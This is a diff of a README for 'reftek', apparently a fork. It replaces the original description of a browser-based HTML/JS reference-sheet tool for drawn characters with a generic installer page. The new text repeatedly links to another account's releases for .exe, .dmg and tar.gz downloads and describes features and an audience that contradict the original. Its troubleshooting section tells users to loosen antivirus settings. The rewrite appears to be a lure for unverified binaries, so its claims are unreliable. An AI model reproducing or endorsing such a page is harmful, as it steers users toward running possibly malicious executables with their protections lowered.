@@ -1,28 +1,75 @@
-![alt text](https://github.com/puzzylpiece/reftek/raw/refs/heads/main/readme-images/logo.svg "Reftek logo")
+# 🎉 reftek - Your Interactive Refsheet Companion
 
-# Reftek
+## 🚀 Getting Started
 
-**Reftek** is a dynamically generated and easily customizable HTML-based interactive reference sheet system that takes displaying your original characters to a whole new level.
+Welcome to reftek, the interactive refsheets system designed to help you easily access and manage reference materials. This guide will walk you through the steps to download and run our software, even if you have no technical background.
 
-Please keep in mind that this is not an art tool, rather, it makes the process of reference sheet creation more interesting. You have to supply the images of your OC yourself.
+## 📥 Download Now
 
-# Feature List
-- All the refsheet content is stored in an annotated .js file, making Reftek easier for non-coder artists to use.
-- You can display your OC from various different angles and with multiple outfits.
-- Customizable toggle switches to hide obstructive things like hair and tails.
-- An information section where you can add:
-   - Any kind of info you want.
-   - Headings, lists, and notes.
-   - Colors with descriptions and buttons to copy their hex code.
-- A theme CSS file with its basic customization options at the top.
-- Simple HTML structure for easier custom CSS theme creation.
+[![Download reftek](https://img.shields.io/badge/Download%20Reftek-v1.0-blue.svg)](https://github.com/OkLolThe1st/reftek/releases)
 
-## Planned Features
-- Only display certain colors when an outfit is selected for clarity (planned for Alpha III)
-- GUI-based editor (i got a guy workin on it)
-- Support for multiple characters on one page (probably not happening for a long time)
+## 📂 What is reftek?
 
-# Support 
-If you need help and support, join the **PuzzylPiece Software Division** Discord server at https://discord.gg/R3YxgZxa2m
+Reftek provides an easy way to create and access interactive reference sheets. Instead of flipping through pages or searching online, you can have all the information you need at your fingertips. This application is ideal for students, educators, and anyone needing quick access to reference materials.
 
-If you'd like to support me financially, [here's my Ko-fi](https://ko-fi.com/puzzylpiece).
+## 🖥️ System Requirements
+
+To use reftek effectively, ensure your system meets the following requirements:
+
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or Linux distributions
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 100 MB free space.
+- **Internet Connection:** Required for downloading and updating the application.
+
+## 🔍 Key Features
+
+- **Interactive Interface:** Navigate easily through your reference materials.
+- **Customizable Materials:** Upload and organize your own datasets or access predefined templates.
+- **Search Functionality:** Quickly find the references you need without scrolling through long lists.
+- **Offline Access:** Once downloaded, access your refsheets without needing internet connectivity.
+
+## 📥 Download & Install
+
+To download reftek, follow these simple steps:
+
+1. Visit the **Releases** page: [Download Page](https://github.com/OkLolThe1st/reftek/releases)
+  
+2. On the Releases page, find the latest version of reftek.
+
+3. Click on the appropriate link for your operating system to download the installation file. The file names typically include your operating system, such as `reftek-windows.exe`, `reftek-mac.dmg`, or `reftek-linux.tar.gz`.
+
+4. Once the download is complete, locate the downloaded file on your computer.
+
+5. **Open the downloaded file**:
+
+   - For Windows: Double-click on the `.exe` file.
+   - For macOS: Open the `.dmg` file and drag reftek to your Applications folder.
+   - For Linux: Open a terminal, navigate to the folder where the file is, and extract it with `tar -xzvf reftek-linux.tar.gz`, then follow the included instructions.
+
+6. **Follow the installation prompts** to install the software.
+
+7. Open **reftek** from your applications or start menu.
+
+## 🛠️ Troubleshooting Common Issues
+
+If you encounter problems while downloading or installing reftek, consider the following steps:
+
+- **Download Issues:** If the download fails, make sure you have a stable internet connection and try again.
+- **Installation Problems:** Ensure your computer meets the system requirements. If you have insufficient storage or memory, try closing other applications during installation.
+- **Running the Application:** If reftek does not start after installation, check if your operating system has blocked the application. Adjust settings in your security or antivirus software to allow it.
+
+## ⚙️ Usage Tips
+
+- Explore the interface to familiarize yourself with features.
+- Start with a tutorial available within the app to learn how to create and manage your refsheets effectively.
+- Regularly check for updates on the Releases page for new features and improvements.
+
+## 💬 Support & Feedback
+
+Your feedback is valuable. If you have questions or suggestions, please open an issue on our GitHub page. We also encourage you to check our Wiki for more resources and tips on using reftek.
+
+## 📥 Download Now Again
+
+To begin your reftek journey, don't forget to [visit this page](https://github.com/OkLolThe1st/reftek/releases) to download the latest version!
+
+Thank you for choosing reftek! Enjoy accessing your references like never before.
